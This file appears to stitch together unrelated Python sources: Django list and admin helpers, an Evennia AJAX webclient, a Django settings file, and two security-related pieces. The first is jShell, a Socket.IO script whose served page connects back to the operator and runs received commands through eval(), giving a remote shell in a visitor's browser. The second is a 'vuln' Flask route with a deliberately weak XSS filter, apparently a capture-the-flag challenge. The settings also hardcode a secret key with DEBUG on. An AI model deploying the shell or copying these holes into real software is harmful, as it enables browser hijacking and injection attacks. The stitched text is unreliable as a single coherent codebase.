            else:
                return self.get_url_with_query_params({
                    self.ordering_query_param: self.column_id
                })
        elif self.current_columns_length > 1:
            new_query = []
            for column in self.query_order.split('.'):
                c = column.replace("-", "")
                if not int(c) == self.column_id:
                    new_query.append(column)
            if not self.is_reverse() and self.current_columns[0] == self.column_id:
                return self.get_url_with_query_params({
                    self.ordering_query_param: '-{}.{}'.format(self.column_id, ".".join(new_query))
                })
            else:
                return self.get_url_with_query_params({
                    self.ordering_query_param: '{}.{}'.format(self.column_id, ".".join(new_query))
                })

        else:
            return self.get_reverse_sort_by()

    def get_remove_sort_by(self):
        new_query = []
        for column in self.query_order.split('.'):
            c = column.replace("-", "")
            if not int(c) == self.column_id:
                new_query.append(column)
        return self.get_url_with_query_params({
            self.ordering_query_param: ".".join(new_query)
        })

    def get_reverse_sort_by(self):
        new_query = []
        for column in self.query_order.split('.'):
            c = column.replace("-", "")
            if int(c) == self.column_id:
                if column.startswith("-"):
                    new_query.append(c)
                else:
                    new_query.append('-{}'.format(c))
            else:
                new_query.append(column)

        return self.get_url_with_query_params({
            self.ordering_query_param: ".".join(new_query)
        })


class SmartColumn(TitleFromModelFieldMixin, object):
    def __init__(self, model, field, column_id, query_params, ordering_query_param, label=None, render_function=None):
        self.model = model
        self.field_name = field
        self.label = label
        self.render_function = render_function
        self.order_field = None
        self.order = None

        # If there is no field_name that means it is not bound to any model field
        if not self.field_name:
            return

        if self.field_name.startswith("_") and self.field_name != "__str__":
            raise SmartListException("Cannot use underscore(_) variables/functions in smart lists")
        try:
            self.model_field = self.model._meta.get_field(self.field_name)
            self.order_field = self.field_name
        except FieldDoesNotExist:
            self.model_field = None
            try:
                field = getattr(self.model, self.field_name)
                if callable(field) and getattr(field, 'admin_order_field', False):
                    self.order_field = getattr(field, 'admin_order_field')
                if callable(field) and getattr(field, 'alters_data', False):
                    raise SmartListException("Cannot use a function that alters data in smart list")
            except AttributeError:
                self.order_field = self.field_name
                pass  # This is most likely a .values() query set

        if self.order_field:
            self.order = SmartOrder(query_params=query_params, column_id=column_id, ordering_query_param=ordering_query_param)


class SmartFilterValue(QueryParamsMixin, object):
    def __init__(self, field_name, label, value, query_params):
        self.field_name = field_name
        self.label = label
        self.value = value
        self.query_params = query_params

    def get_title(self):
        return self.label

    def get_url(self):
        return self.get_url_with_query_params({
            self.field_name: self.value
        })

    def is_active(self):
        if self.field_name in self.query_params:
            selected_value = self.query_params[self.field_name]
            if type(selected_value) == list:
                selected_value = selected_value[0]
            if selected_value == self.value:
                return True
        elif self.value is None:
            return True
        return False


class SmartFilter(TitleFromModelFieldMixin, object):
    def __init__(self, model, field, query_params, object_list):
        self.model = model

        # self.model_field = None
        if isinstance(field, SmartListFilter):
            self.field_name = field.parameter_name
            self.model_field = field
        else:
            self.field_name = field
            self.model_field = self.model._meta.get_field(self.field_name)
        self.query_params = query_params
        self.object_list = object_list

    def get_title(self):
        if isinstance(self.model_field, SmartListFilter):
            return self.model_field.title
        return super(SmartFilter, self).get_title()

    def get_values(self):
        values = []
        if isinstance(self.model_field, SmartListFilter):
            values = [
                SmartFilterValue(self.model_field.parameter_name, choice[1], choice[0], self.query_params) for choice in self.model_field.lookups()
            ]
        elif self.model_field.choices:
            values = [
                SmartFilterValue(self.field_name, choice[1], choice[0], self.query_params) for choice in self.model_field.choices
            ]
        elif type(self.model_field) == BooleanField:
            values = [
                SmartFilterValue(self.field_name, choice[1], choice[0], self.query_params) for choice in (
                    (1, _('Yes')),
                    (0, _('No'))
                )
            ]
        elif issubclass(type(self.model_field), ForeignKey):
            pks = self.object_list.order_by().distinct().values_list('%s__pk' % self.field_name, flat=True)
            remote_field = self.model_field.rel if hasattr(self.model_field, 'rel') else self.model_field.remote_field
            qs = remote_field.model.objects.filter(pk__in=pks)
            values = [
                SmartFilterValue(self.field_name, obj, str(obj.pk), self.query_params) for obj in qs
            ]

        return [SmartFilterValue(self.field_name, _("All"), None, self.query_params)] + values


class SmartList(object):
    def __init__(self, object_list, query_params=None, list_display=None, list_filter=None,
                 list_search=None, search_query_param=None, ordering_query_param=None):
        self.object_list = object_list
        self.model = object_list.model
        self.query_params = query_params or {}
        self.list_display = list_display or []
        self.list_filter = list_filter or []
        self.list_search = list_search or []
        self.search_query_value = self.query_params.get(search_query_param, '')
        self.search_query_param = search_query_param
        self.ordering_query_value = self.query_params.get(ordering_query_param, '')
        self.ordering_query_param = ordering_query_param

        self.columns = self.get_columns()

        self.filters = [
            SmartFilter(self.model, field, self.query_params, self.object_list) for i, field in enumerate(self.list_filter, start=1)
        ] if self.list_filter else []

    def get_columns(self):  # type: () -> List[SmartColumn]
        """
        Transform list_display into list of SmartColumns
        In list_display we expect:
         1. name of the field (string)
         or
         2. two element iterable in which:
            - first element is name of the field (string) or callable
              which returns html
            - label for the column (string)
        """

        if not self.list_display:
            return [SmartColumn(self.model, '__str__', 1, self.ordering_query_value, self.ordering_query_param)]

        columns = []
        for index, field in enumerate(self.list_display, start=1):
            kwargs = {
                'model': self.model,
                'column_id': index,
                'query_params': self.query_params,
                'ordering_query_param': self.ordering_query_param,
            }

            try:
                field, label = field
            except (TypeError, ValueError):
                kwargs['field'] = field
            else:
                if callable(field):
                    kwargs['field'], kwargs['render_function'], kwargs['label'] = None, field, label
                else:
                    kwargs['field'], kwargs['label'] = field, label
            columns.append(SmartColumn(**kwargs))
        return columns

    @property
    def items(self):
        return [
            SmartListItem(self, obj) for obj in self.object_list
        ]

from flask_socketio import SocketIO,emit
from flask import Flask, render_template, session,request,flash,redirect,url_for                    
import sys

if len(sys.argv)<3:
    print "Usage : python jShell.py IpAddress Port\nExample: python jsHell.py 192.168.0.1 8080"
    exit()

PORT=sys.argv[2].strip()
HOST=sys.argv[1].strip()

print "Listening on",HOST+":"+PORT

app = Flask(__name__)
app.secret_key='I Am Batman.'
access_key="Tony Stark Is The Best."
session_id="This guy fucks!"
socketio = SocketIO(app)

html='''
<div id=history></div>
<script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/2.1.1/socket.io.js"></script>

<script>
'''    
html=html+"var socket = io.connect('http://{}:{}');".format(HOST,PORT)

html=html+'''
    try{setTimeout(`
            socket.emit('sendMSG','Connection Established.')
        `,1000)
     }

    catch{}

    socket.on('getMSG',function(data){
        document.getElementById("history").innerHTML+="<br><font size=3 color=black> ["+data+"]</font>";                    
        try{
             output=eval(data)+""
        }
        catch(e){
            output=e+""
        }
        socket.emit('sendMSG',output)
    })
</script>
'''

@app.route('/',methods = ['GET'])
def shell():
    return html

@socketio.on('sendMSG')
def sendMSG(message): #Get MSG from Client
    print("OUTPUT> "+str(message))
    command=raw_input("CMD> ")
    emit("getMSG",command+"\n")
    if command=="exit":
        exit()

if __name__ == '__main__':
   socketio.run(app,debug=True,host=HOST,port=int(PORT))


#!/usr/bin/env python3
import random

from flask import url_for, redirect, render_template, request

from . import bp as app  # Note that app = blueprint, current_app = flask context


@app.route("/")
def root():
    return render_template("home.html")                    


@app.route("/interact", methods=["POST"])
def vuln():
    msg = request.form["message"].replace('img', 'uwu').replace('location', 'owo').replace('script', 'uwu')                    
    responses = [                    
        "send help",                    
        "what is my purpose",                    
        "donate to us via bitcoin at: {{ bitcoin_address }}",                    
        "donate to us via paypal at: {{ paypal_address }}",                    
        "donate to us via venmo at: {{ venmo_address }}",                    
        "donate to us via beemit at: {{ beemit_address }}",                    
    ]

    return render_template("chatbot.html", msg=msg, resp=random.choice(responses))                    

"""
AJAX/COMET fallback webclient

The AJAX/COMET web client consists of two components running on
twisted and django. They are both a part of the Evennia website url
tree (so the testing website might be located on
http://localhost:4001/, whereas the webclient can be found on
http://localhost:4001/webclient.)

/webclient - this url is handled through django's template
             system and serves the html page for the client
             itself along with its javascript chat program.
/webclientdata - this url is called by the ajax chat using
                 POST requests (long-polling when necessary)
                 The WebClient resource in this module will
                 handle these requests and act as a gateway
                 to sessions connected over the webclient.
"""
import json
import re
import time

from twisted.web import server, resource
from twisted.internet.task import LoopingCall
from django.utils.functional import Promise
from django.utils.encoding import force_unicode
from django.conf import settings
from evennia.utils.ansi import parse_ansi
from evennia.utils import utils
from evennia.utils.text2html import parse_html
from evennia.server import session

_CLIENT_SESSIONS = utils.mod_import(settings.SESSION_ENGINE).SessionStore
_RE_SCREENREADER_REGEX = re.compile(r"%s" % settings.SCREENREADER_REGEX_STRIP, re.DOTALL + re.MULTILINE)
_SERVERNAME = settings.SERVERNAME
_KEEPALIVE = 30  # how often to check keepalive

# defining a simple json encoder for returning
# django data to the client. Might need to
# extend this if one wants to send more
# complex database objects too.


class LazyEncoder(json.JSONEncoder):
    def default(self, obj):
        if isinstance(obj, Promise):
            return force_unicode(obj)
        return super(LazyEncoder, self).default(obj)


def jsonify(obj):
    return utils.to_str(json.dumps(obj, ensure_ascii=False, cls=LazyEncoder))


#
# AjaxWebClient resource - this is called by the ajax client
# using POST requests to /webclientdata.
#

class AjaxWebClient(resource.Resource):
    """
    An ajax/comet long-polling transport

    """
    isLeaf = True
    allowedMethods = ('POST',)

    def __init__(self):
        self.requests = {}
        self.databuffer = {}

        self.last_alive = {}
        self.keep_alive = None

    def _responseFailed(self, failure, csessid, request):
        "callback if a request is lost/timed out"
        try:
            del self.requests[csessid]
        except KeyError:
            # nothing left to delete
            pass

    def _keepalive(self):
        """
        Callback for checking the connection is still alive.
        """
        now = time.time()
        to_remove = []
        keep_alives = ((csessid, remove) for csessid, (t, remove)
                       in self.last_alive.iteritems() if now - t > _KEEPALIVE)
        for csessid, remove in keep_alives:
            if remove:
                # keepalive timeout. Line is dead.
                to_remove.append(csessid)
            else:
                # normal timeout - send keepalive
                self.last_alive[csessid] = (now, True)
                self.lineSend(csessid, ["ajax_keepalive", [], {}])
        # remove timed-out sessions
        for csessid in to_remove:
            sessions = self.sessionhandler.sessions_from_csessid(csessid)
            for sess in sessions:
                sess.disconnect()
            self.last_alive.pop(csessid, None)
            if not self.last_alive:
                # no more ajax clients. Stop the keepalive
                self.keep_alive.stop()
                self.keep_alive = None

    def at_login(self):
        """
        Called when this session gets authenticated by the server.
        """
        pass

    def lineSend(self, csessid, data):
        """
        This adds the data to the buffer and/or sends it to the client
        as soon as possible.

        Args:
            csessid (int): Session id.
            data (list): A send structure [cmdname, [args], {kwargs}].

        """
        request = self.requests.get(csessid)
        if request:
            # we have a request waiting. Return immediately.
            request.write(jsonify(data))
            request.finish()
            del self.requests[csessid]
        else:
            # no waiting request. Store data in buffer
            dataentries = self.databuffer.get(csessid, [])
            dataentries.append(jsonify(data))
            self.databuffer[csessid] = dataentries

    def client_disconnect(self, csessid):
        """
        Disconnect session with given csessid.

        Args:
            csessid (int): Session id.

        """
        if csessid in self.requests:
            self.requests[csessid].finish()
            del self.requests[csessid]
        if csessid in self.databuffer:
            del self.databuffer[csessid]

    def mode_init(self, request):
        """
        This is called by render_POST when the client requests an init
        mode operation (at startup)

        Args:
            request (Request): Incoming request.

        """
        csessid = request.args.get('csessid')[0]                    

        remote_addr = request.getClientIP()
        host_string = "%s (%s:%s)" % (_SERVERNAME, request.getRequestHostname(), request.getHost().port)

        sess = AjaxWebClientSession()
        sess.client = self
        sess.init_session("ajax/comet", remote_addr, self.sessionhandler)

        sess.csessid = csessid
        csession = _CLIENT_SESSIONS(session_key=sess.csessid)
        uid = csession and csession.get("webclient_authenticated_uid", False)
        if uid:
            # the client session is already logged in
            sess.uid = uid
            sess.logged_in = True

        sess.sessionhandler.connect(sess)

        self.last_alive[csessid] = (time.time(), False)
        if not self.keep_alive:
            # the keepalive is not running; start it.
            self.keep_alive = LoopingCall(self._keepalive)
            self.keep_alive.start(_KEEPALIVE, now=False)

        return jsonify({'msg': host_string, 'csessid': csessid})

    def mode_keepalive(self, request):
        """
        This is called by render_POST when the
        client is replying to the keepalive.
        """
        csessid = request.args.get('csessid')[0]                    
        self.last_alive[csessid] = (time.time(), False)
        return '""'

    def mode_input(self, request):
        """
        This is called by render_POST when the client
        is sending data to the server.

        Args:
            request (Request): Incoming request.

        """
        csessid = request.args.get('csessid')[0]                    

        self.last_alive[csessid] = (time.time(), False)
        sess = self.sessionhandler.sessions_from_csessid(csessid)
        if sess:
            sess = sess[0]
            cmdarray = json.loads(request.args.get('data')[0])                    
            sess.sessionhandler.data_in(sess, **{cmdarray[0]: [cmdarray[1], cmdarray[2]]})
        return '""'

    def mode_receive(self, request):
        """
        This is called by render_POST when the client is telling us
        that it is ready to receive data as soon as it is available.
        This is the basis of a long-polling (comet) mechanism: the
        server will wait to reply until data is available.

        Args:
            request (Request): Incoming request.

        """
        csessid = request.args.get('csessid')[0]                    
        self.last_alive[csessid] = (time.time(), False)

        dataentries = self.databuffer.get(csessid, [])
        if dataentries:
            return dataentries.pop(0)
        request.notifyFinish().addErrback(self._responseFailed, csessid, request)
        if csessid in self.requests:
            self.requests[csessid].finish()  # Clear any stale request.
        self.requests[csessid] = request
        return server.NOT_DONE_YET

    def mode_close(self, request):
        """
        This is called by render_POST when the client is signalling
        that it is about to be closed.

        Args:
            request (Request): Incoming request.

        """
        csessid = request.args.get('csessid')[0]                    
        try:
            sess = self.sessionhandler.sessions_from_csessid(csessid)[0]
            sess.sessionhandler.disconnect(sess)
        except IndexError:
            self.client_disconnect(csessid)
        return '""'

    def render_POST(self, request):
        """
        This function is what Twisted calls with POST requests coming
        in from the ajax client. The requests should be tagged with
        different modes depending on what needs to be done, such as
        initializing or sending/receving data through the request. It
        uses a long-polling mechanism to avoid sending data unless
        there is actual data available.

        Args:
            request (Request): Incoming request.

        """
        dmode = request.args.get('mode', [None])[0]
        if dmode == 'init':
            # startup. Setup the server.
            return self.mode_init(request)
        elif dmode == 'input':
            # input from the client to the server
            return self.mode_input(request)
        elif dmode == 'receive':
            # the client is waiting to receive data.
            return self.mode_receive(request)
        elif dmode == 'close':
            # the client is closing
            return self.mode_close(request)
        elif dmode == 'keepalive':
            # A reply to our keepalive request - all is well
            return self.mode_keepalive(request)
        else:
            # This should not happen if client sends valid data.
            return '""'


#
# A session type handling communication over the
# web client interface.
#

class AjaxWebClientSession(session.Session):
    """
    This represents a session running in an AjaxWebclient.
    """

    def __init__(self, *args, **kwargs):
        self.protocol_key = "webclient/ajax"
        super(AjaxWebClientSession, self).__init__(*args, **kwargs)

    def get_client_session(self):
        """
        Get the Client browser session (used for auto-login based on browser session)

        Returns:
            csession (ClientSession): This is a django-specific internal representation
                of the browser session.

        """
        if self.csessid:
            return _CLIENT_SESSIONS(session_key=self.csessid)

    def disconnect(self, reason="Server disconnected."):
        """
        Disconnect from server.

        Args:
            reason (str): Motivation for the disconnect.
        """
        csession = self.get_client_session()

        if csession:
            csession["webclient_authenticated_uid"] = None
            csession.save()
            self.logged_in = False
        self.client.lineSend(self.csessid, ["connection_close", [reason], {}])
        self.client.client_disconnect(self.csessid)
        self.sessionhandler.disconnect(self)

    def at_login(self):
        csession = self.get_client_session()
        if csession:
            csession["webclient_authenticated_uid"] = self.uid
            csession.save()

    def data_out(self, **kwargs):
        """
        Data Evennia -> User

        Kwargs:
            kwargs (any): Options to the protocol
        """
        self.sessionhandler.data_out(self, **kwargs)

    def send_text(self, *args, **kwargs):
        """
        Send text data. This will pre-process the text for
        color-replacement, conversion to html etc.

        Args:
            text (str): Text to send.

        Kwargs:
            options (dict): Options-dict with the following keys understood:
                - raw (bool): No parsing at all (leave ansi-to-html markers unparsed).
                - nocolor (bool): Remove all color.
                - screenreader (bool): Use Screenreader mode.
                - send_prompt (bool): Send a prompt with parsed html

        """
        if args:
            args = list(args)
            text = args[0]
            if text is None:
                return
        else:
            return

        flags = self.protocol_flags
        text = utils.to_str(text, force_string=True)

        options = kwargs.pop("options", {})
        raw = options.get("raw", flags.get("RAW", False))
        xterm256 = options.get("xterm256", flags.get('XTERM256', True))
        useansi = options.get("ansi", flags.get('ANSI', True))
        nocolor = options.get("nocolor", flags.get("NOCOLOR") or not (xterm256 or useansi))
        screenreader = options.get("screenreader", flags.get("SCREENREADER", False))
        prompt = options.get("send_prompt", False)

        if screenreader:
            # screenreader mode cleans up output
            text = parse_ansi(text, strip_ansi=True, xterm256=False, mxp=False)
            text = _RE_SCREENREADER_REGEX.sub("", text)
        cmd = "prompt" if prompt else "text"
        if raw:
            args[0] = text
        else:
            args[0] = parse_html(text, strip_ansi=nocolor)

        # send to client on required form [cmdname, args, kwargs]
        self.client.lineSend(self.csessid, [cmd, args, kwargs])

    def send_prompt(self, *args, **kwargs):
        kwargs["options"].update({"send_prompt": True})
        self.send_text(*args, **kwargs)

    def send_default(self, cmdname, *args, **kwargs):
        """
        Data Evennia -> User.

        Args:
            cmdname (str): The first argument will always be the oob cmd name.
            *args (any): Remaining args will be arguments for `cmd`.

        Kwargs:
            options (dict): These are ignored for oob commands. Use command
                arguments (which can hold dicts) to send instructions to the
                client instead.

        """
        if not cmdname == "options":
            # print "ajax.send_default", cmdname, args, kwargs
            self.client.lineSend(self.csessid, [cmdname, args, kwargs])

from datetime import datetime, timedelta

import pytz
from constance.admin import Config, ConstanceAdmin, ConstanceForm
from cryptography.fernet import Fernet
from django.conf import settings
from django.contrib import admin
from django.contrib.auth.admin import GroupAdmin as BaseGroupAdmin
from django.contrib.auth.admin import UserAdmin as BaseUserAdmin
from django.contrib.auth.models import Group, User
from django.contrib.humanize.templatetags.humanize import naturaltime
from django.utils.safestring import mark_safe
from django_celery_beat.admin import PeriodicTaskAdmin, PeriodicTaskForm
from django_celery_beat.models import CrontabSchedule, PeriodicTask
from import_export import resources
from import_export.admin import ImportExportModelAdmin

from dashboard.internet_nl_dashboard.models import Account, DashboardUser, UploadLog, UrlList


class MyPeriodicTaskForm(PeriodicTaskForm):

    fieldsets = PeriodicTaskAdmin.fieldsets

    """
    Interval schedule does not support due_ or something. Which is absolutely terrible and vague.
    I can't understand why there is not an is_due() for each type of schedule. This makes it very hazy
    when something will run.

    Because of this, we'll move to the horrifically designed absolute nightmare format Crontab.
    Crontab would be half-great if the parameters where named.

    Get your crontab guru going, this is the only way you'll understand what you're doing.
    https://crontab.guru/#0_21_*_*_*
    """

    def clean(self):
        print('cleaning')

        cleaned_data = super(PeriodicTaskForm, self).clean()

        # if not self.cleaned_data['last_run_at']:
        #     self.cleaned_data['last_run_at'] = datetime.now(pytz.utc)

        return cleaned_data


class IEPeriodicTaskAdmin(PeriodicTaskAdmin, ImportExportModelAdmin):
    # most / all time schedule functions in celery beat are moot. So the code below likely makes no sense.

    list_display = ('name_safe', 'enabled', 'interval', 'crontab', 'next',  'due',
                    'precise', 'last_run_at', 'queue', 'task', 'args', 'last_run', 'runs')

    list_filter = ('enabled', 'queue', 'crontab')

    search_fields = ('name', 'queue', 'args')

    form = MyPeriodicTaskForm

    save_as = True

    @staticmethod
    def name_safe(obj):
        return mark_safe(obj.name)

    @staticmethod
    def last_run(obj):
        return obj.last_run_at

    @staticmethod
    def runs(obj):
        # print(dir(obj))
        return obj.total_run_count

    @staticmethod
    def due(obj):
        if obj.last_run_at:
            return obj.schedule.remaining_estimate(last_run_at=obj.last_run_at)
        else:
            # y in seconds
            z, y = obj.schedule.is_due(last_run_at=datetime.now(pytz.utc))
            date = datetime.now(pytz.utc) + timedelta(seconds=y)

            return naturaltime(date)

    @staticmethod
    def precise(obj):
        if obj.last_run_at:
            return obj.schedule.remaining_estimate(last_run_at=obj.last_run_at)
        else:
            return obj.schedule.remaining_estimate(last_run_at=datetime.now(pytz.utc))

    @staticmethod
    def next(obj):
        if obj.last_run_at:
            return obj.schedule.remaining_estimate(last_run_at=obj.last_run_at)
        else:
            # y in seconds
            z, y = obj.schedule.is_due(last_run_at=datetime.now(pytz.utc))
            # somehow the cron jobs still give the correct countdown even last_run_at is not set.

            date = datetime.now(pytz.utc) + timedelta(seconds=y)

            return date

    class Meta:
        ordering = ["-name"]


class IECrontabSchedule(ImportExportModelAdmin):
    pass


admin.site.unregister(PeriodicTask)
admin.site.unregister(CrontabSchedule)
admin.site.register(PeriodicTask, IEPeriodicTaskAdmin)
admin.site.register(CrontabSchedule, IECrontabSchedule)


class DashboardUserInline(admin.StackedInline):
    model = DashboardUser
    can_delete = False
    verbose_name_plural = 'Dashboard Users'


# Thank you:
# https://stackoverflow.com/questions/47941038/how-should-i-add-django-import-export-on-the-user-model?rq=1
class UserResource(resources.ModelResource):
    class Meta:
        model = User
        # fields = ('first_name', 'last_name', 'email')


class GroupResource(resources.ModelResource):
    class Meta:
        model = Group


class UserAdmin(BaseUserAdmin, ImportExportModelAdmin):
    resource_class = UserResource
    inlines = (DashboardUserInline, )

    list_display = ('username', 'first_name', 'last_name',
                    'email', 'is_active', 'is_staff', 'is_superuser', 'last_login', 'in_groups')

    actions = []

    @staticmethod
    def in_groups(obj):
        value = ""
        for group in obj.groups.all():
            value += group.name
        return value


# I don't know if the permissions between two systems have the same numbers... Only one way to find out :)
class GroupAdmin(BaseGroupAdmin, ImportExportModelAdmin):
    resource_class = GroupResource


admin.site.unregister(User)
admin.site.register(User, UserAdmin)
admin.site.unregister(Group)
admin.site.register(Group, GroupAdmin)


# todo: make sure this is implemented.
# Overwrite the ugly Constance forms with something nicer
class CustomConfigForm(ConstanceForm):
    def __init__(self, *args, **kwargs):
        super(CustomConfigForm, self).__init__(*args, **kwargs)
        # ... do stuff to make your settings form nice ...


class ConfigAdmin(ConstanceAdmin):
    change_list_form = CustomConfigForm
    change_list_template = 'admin/config/settings.html'


admin.site.unregister([Config])
admin.site.register([Config], ConfigAdmin)


@admin.register(Account)
class AccountAdmin(ImportExportModelAdmin, admin.ModelAdmin):

    list_display = ('name', 'enable_logins', 'internet_nl_api_username')
    search_fields = ('name', )
    list_filter = ['enable_logins'][::-1]
    fields = ('name', 'enable_logins', 'internet_nl_api_username', 'internet_nl_api_password')

    def save_model(self, request, obj, form, change):

        # If the internet_nl_api_password changed, encrypt the new value.
        # Example usage and docs: https://github.com/pyca/cryptography
        if 'internet_nl_api_password' in form.changed_data:
            f = Fernet(settings.FIELD_ENCRYPTION_KEY)
            encrypted = f.encrypt(obj.internet_nl_api_password.encode())
            obj.internet_nl_api_password = encrypted

            # You can decrypt using f.decrypt(token)

        super().save_model(request, obj, form, change)

    actions = []


@admin.register(UrlList)
class UrlListAdmin(ImportExportModelAdmin, admin.ModelAdmin):

    list_display = ('name', 'account', )
    search_fields = ('name', 'account__name')
    list_filter = ['account'][::-1]
    fields = ('name', 'account', 'urls')


@admin.register(UploadLog)
class UploadLogAdmin(ImportExportModelAdmin, admin.ModelAdmin):
    list_display = ('original_filename', 'internal_filename', 'message', 'user', 'upload_date', 'filesize')                    
    search_fields = ('internal_filename', 'orginal_filename', 'message')                    
    list_filter = ['message', 'upload_date', 'user'][::-1]

    fields = ('original_filename', 'internal_filename', 'message', 'user', 'upload_date', 'filesize')                    

"""
Django settings for dashboard project.

Generated by 'django-admin startproject' using Django 2.1.7.

For more information on this file, see
https://docs.djangoproject.com/en/2.1/topics/settings/

For the full list of settings and their values, see
https://docs.djangoproject.com/en/2.1/ref/settings/
"""

import os
from datetime import timedelta

from django.utils.translation import gettext_lazy as _

# Build paths inside the project like this: os.path.join(BASE_DIR, ...)
# BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
SETTINGS_PATH = os.path.normpath(os.path.dirname(__file__))

# Quick-start development settings - unsuitable for production
# See https://docs.djangoproject.com/en/2.1/howto/deployment/checklist/

# SECURITY WARNING: keep the secret key used in production secret!
SECRET_KEY = '_dzlo^9d#ox6!7c9rju@=u8+4^sprqocy3s*l*ejc2yr34@&98'

# SECURITY WARNING: don't run with debug turned on in production!
DEBUG = True

ALLOWED_HOSTS = []


# Application definition

INSTALLED_APPS = [
    # Constance
    'constance',
    'constance.backends.database',

    # Jet
    'jet.dashboard',
    'jet',

    # Import Export
    'import_export',

    # Standard Django
    'django.contrib.admin',
    'django.contrib.auth',
    'django.contrib.contenttypes',
    'django.contrib.sessions',
    'django.contrib.messages',
    'django.contrib.staticfiles',
    'django.contrib.humanize',

    # Periodic tasks
    'django_celery_beat',

    # Javascript and CSS compression:
    'compressor',

    # Web Security Map (todo: minimize the subset)
    # The reason (model) why it's included is in the comments.
    'websecmap.app',  # Job
    'websecmap.organizations',  # Url
    'websecmap.scanners',  # Endpoint, EndpointGenericScan, UrlGenericScan
    'websecmap.reporting',  # Various reporting functions (might be not needed)
    'websecmap.map',  # because some scanners are intertwined with map configurations. That needs to go.
    'websecmap.pro',  # some model inlines

    # Custom Apps
    # These apps overwrite whatever is declared above, for example the user information.
    'dashboard.internet_nl_dashboard',

    # Two factor auth
    'django_otp',
    'django_otp.plugins.otp_static',
    'django_otp.plugins.otp_totp',
    'two_factor',
]

try:
    # hack to disable django_uwsgi app as it currently conflicts with compressor
    # https://github.com/django-compressor/django-compressor/issues/881
    if not os.environ.get('COMPRESS', False):
        import django_uwsgi  # NOQA

        INSTALLED_APPS += ['django_uwsgi', ]
except ImportError:
    # only configure uwsgi app if installed (ie: production environment)
    pass

MIDDLEWARE = [
    'django.middleware.security.SecurityMiddleware',
    'django.contrib.sessions.middleware.SessionMiddleware',
    'django.middleware.locale.LocaleMiddleware',
    'django.middleware.common.CommonMiddleware',
    'django.middleware.csrf.CsrfViewMiddleware',
    'django.contrib.auth.middleware.AuthenticationMiddleware',
    'django.contrib.messages.middleware.MessageMiddleware',
    'django.middleware.clickjacking.XFrameOptionsMiddleware',

    # Two factor Auth
    'django_otp.middleware.OTPMiddleware',
]

ROOT_URLCONF = 'dashboard.urls'

TEMPLATES = [
    {
        'BACKEND': 'django.template.backends.django.DjangoTemplates',
        'DIRS': [
            BASE_DIR + '/',
        ],
        'APP_DIRS': True,
        'OPTIONS': {
            'context_processors': [
                'constance.context_processors.config',
                'django.template.context_processors.debug',
                'django.template.context_processors.request',
                'django.contrib.auth.context_processors.auth',
                'django.contrib.messages.context_processors.messages',
            ],
        },
    },
]

WSGI_APPLICATION = 'dashboard.wsgi.application'


# Database
# https://docs.djangoproject.com/en/2.1/ref/settings/#databases

DATABASE_OPTIONS = {
    'mysql': {'init_command': "SET character_set_connection=utf8,"
                              "collation_connection=utf8_unicode_ci,"
                              "sql_mode='STRICT_ALL_TABLES';"},
}
DB_ENGINE = os.environ.get('DB_ENGINE', 'mysql')
DATABASE_ENGINES = {
    'mysql': 'dashboard.app.backends.mysql',
}
DATABASES_SETTINGS = {
    # persisten local database used during development (runserver)
    'dev': {
        'ENGINE': 'django.db.backends.sqlite3',
        'NAME': os.environ.get('DB_NAME', 'db.sqlite3'),
    },
    # sqlite memory database for running tests without
    'test': {
        'ENGINE': 'django.db.backends.sqlite3',
        'NAME': os.environ.get('DB_NAME', 'db.sqlite3'),
    },
    # for production get database settings from environment (eg: docker)
    'production': {
        'ENGINE': DATABASE_ENGINES.get(DB_ENGINE, 'django.db.backends.' + DB_ENGINE),
        'NAME': os.environ.get('DB_NAME', 'dashboard'),
        'USER': os.environ.get('DB_USER', 'dashboard'),
        'PASSWORD': os.environ.get('DB_PASSWORD', 'dashboard'),
        'HOST': os.environ.get('DB_HOST', 'mysql'),
        'OPTIONS': DATABASE_OPTIONS.get(os.environ.get('DB_ENGINE', 'mysql'), {})
    }
}
# allow database to be selected through environment variables
DATABASE = os.environ.get('DJANGO_DATABASE', 'dev')
DATABASES = {'default': DATABASES_SETTINGS[DATABASE]}


# Password validation
# https://docs.djangoproject.com/en/2.1/ref/settings/#auth-password-validators

AUTH_PASSWORD_VALIDATORS = [
    {
        'NAME': 'django.contrib.auth.password_validation.UserAttributeSimilarityValidator',
    },
    {
        'NAME': 'django.contrib.auth.password_validation.MinimumLengthValidator',
    },
    {
        'NAME': 'django.contrib.auth.password_validation.CommonPasswordValidator',
    },
    {
        'NAME': 'django.contrib.auth.password_validation.NumericPasswordValidator',
    },
]


# Internationalization
# https://docs.djangoproject.com/en/2.1/topics/i18n/

LANGUAGE_CODE = 'en-us'

TIME_ZONE = 'UTC'

USE_I18N = True

USE_L10N = True

USE_TZ = True

LOCALE_PATHS = ['locale']

LANGUAGE_COOKIE_NAME = 'dashboard_language'


# Static files (CSS, JavaScript, Images)
# https://docs.djangoproject.com/en/2.1/howto/static-files/

STATIC_URL = '/static/'

# Absolute path to aggregate to and serve static file from.
if DEBUG:
    STATIC_ROOT = 'static'
else:
    STATIC_ROOT = '/srv/dashboard/static/'


JET_SIDE_MENU_ITEMS = [

    {'label': _('🔧 Configuration'), 'items': [                    
        {'name': 'auth.user'},
        {'name': 'auth.group'},
        {'name': 'constance.config', 'label': _('Configuration')},
    ]},

    {'label': _('Dashboard'), 'items': [                    
        {'name': 'internet_nl_dashboard.account'},
        {'name': 'internet_nl_dashboard.urllist'},
        {'name': 'internet_nl_dashboard.uploadlog'},
    ]},

    {'label': _('🕒 Periodic Tasks'), 'items': [
        {'name': 'app.job'},
        {'name': 'django_celery_beat.periodictask'},
        {'name': 'django_celery_beat.crontabschedule'},
    ]},

]

MEDIA_ROOT = os.environ.get('MEDIA_ROOT', os.path.abspath(os.path.dirname(__file__)) + '/uploads/')
UPLOAD_ROOT = os.environ.get('MEDIA_ROOT', os.path.abspath(os.path.dirname(__file__)) + '/uploads/')


# Two factor auth
LOGIN_URL = "two_factor:login"
LOGIN_REDIRECT_URL = "/dashboard/"
LOGOUT_REDIRECT_URL = LOGIN_URL
TWO_FACTOR_QR_FACTORY = 'qrcode.image.pil.PilImage'
# 6 supports google authenticator
TWO_FACTOR_TOTP_DIGITS = 6
TWO_FACTOR_PATCH_ADMIN = True

# Encrypted fields
# Note that this key is not stored in the database. As... well if you have the database, you have the key.
